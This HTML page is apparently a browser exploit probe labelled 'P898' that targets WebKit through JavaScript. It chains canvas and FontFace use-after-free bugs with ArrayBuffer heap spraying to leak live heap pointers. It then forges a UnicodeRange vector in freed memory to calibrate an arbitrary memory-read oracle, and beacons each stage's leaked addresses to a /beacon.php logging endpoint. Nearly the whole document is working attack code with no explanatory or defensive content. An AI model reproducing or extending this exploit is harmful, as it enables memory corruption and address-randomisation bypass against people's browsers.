<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P898: UnicodeRange Arbitrary Read Oracle & In-Memory Calibration</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P898...</div>
<h2>P898: UnicodeRange Arbitrary Read Oracle & In-Memory Calibration</h2>
<pre id="log">Initializing diagnostic probe P898...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P898-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function hex64(dv, off) {
  var lo = dv.getUint32(off, true);
  var hi = dv.getUint32(off + 4, true);
  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
}

log('[*] Probe P898 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Canvas UAF Pre-Setup (Dual Aliases)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 1: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * PHASE 2: Single-Pass FontFace UAF & 192B Template Capture
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    // 1. Free the 192B CSSFontFace
    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    // 2. Spray 64 ArrayBuffer(192) to catch slot #0
    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));

    // 3. Force font check to write WebKit's pointers
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;

  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var delta = 0;
  var fontDV = null;

  if (bestI >= 0 && bestNz >= 4) {
    fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
      delta = H_lo - q13lo;
    }
  }

  log('[+] Phase 2: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Delta=' + delta + 'B, Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);

  /* ============================================================
   * PHASE 3: UnicodeRange Memory Oracle Calibration
   * ============================================================ */
  var oracleOk = false;
  var oracleResults = [];

  if (fontDV && H_hi !== 0) {
    try {
      // Baseline check before modification
      var baseCheckB = document.fonts.check('1em bb1', 'B');
      var baseCheckX = document.fonts.check('1em bb1', 'X');

      // Test forging m_ranges Vector at offset 0x28 or 0x30
      // Construct an in-buffer range struct at offset 0x70..0x78 in the same ArrayBuffer:
      // from = 0x0041 ('A'), to = 0x0043 ('C')
      fontDV.setUint32(0x70, 0x0041, true); // range.from = 'A'
      fontDV.setUint32(0x74, 0x0043, true); // range.to   = 'C'

      var rangePtr_lo = (H_lo + 0x70) >>> 0;
      var rangePtr_hi = H_hi;

      // Test candidate offsets for Vector<UnicodeRange> m_ranges:
      var candidateOffsets = [0x28, 0x30, 0x38];
      for (var c = 0; c < candidateOffsets.length; c++) {
        var off = candidateOffsets[c];

        // Backup original qword
        var origLo = fontDV.getUint32(off, true);
        var origHi = fontDV.getUint32(off + 4, true);
        var origCap = fontDV.getUint32(off + 8, true);
        var origSz  = fontDV.getUint32(off + 12, true);

        // Inject forged vector pointing to our range [A..C]
        fontDV.setUint32(off, rangePtr_lo, true);
        fontDV.setUint32(off + 4, rangePtr_hi, true);
        fontDV.setUint32(off + 8, 1, true);  // capacity = 1
        fontDV.setUint32(off + 12, 1, true); // size = 1

        var chkA = document.fonts.check('1em bb1', 'A'); // should match (true)
        var chkB = document.fonts.check('1em bb1', 'B'); // should match (true)
        var chkZ = document.fonts.check('1em bb1', 'Z'); // should fail (false)

        oracleResults.push('off0x' + off.toString(16) + ':A=' + chkA + ',B=' + chkB + ',Z=' + chkZ);

        if (chkA === true && chkB === true && chkZ === false) {
          oracleOk = true;
          log('[***] MEMORY ORACLE CONFIRMED AT OFFSET 0x' + off.toString(16) + '!', 'hot');
          break;
        }

        // Restore
        fontDV.setUint32(off, origLo, true);
        fontDV.setUint32(off + 4, origHi, true);
        fontDV.setUint32(off + 8, origCap, true);
        fontDV.setUint32(off + 12, origSz, true);
      }
    } catch(e) {
      oracleResults.push('err=' + (e.message || '').slice(0, 60));
    }
  }

  log('[+] Phase 3: UnicodeRange Oracle: ok=' + oracleOk + ' | ' + oracleResults.join('; '), oracleOk ? 'hot' : 'info');
  syncBn('ORACLE-TEST', 'ok=' + oracleOk + '|res=' + oracleResults.join(';'));

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P898 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P898 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - UnicodeRange Oracle: ' + oracleOk, oracleOk ? 'hot' : 'info');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|oracleOk=' + oracleOk + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 600);
</script>
</body>
</html>
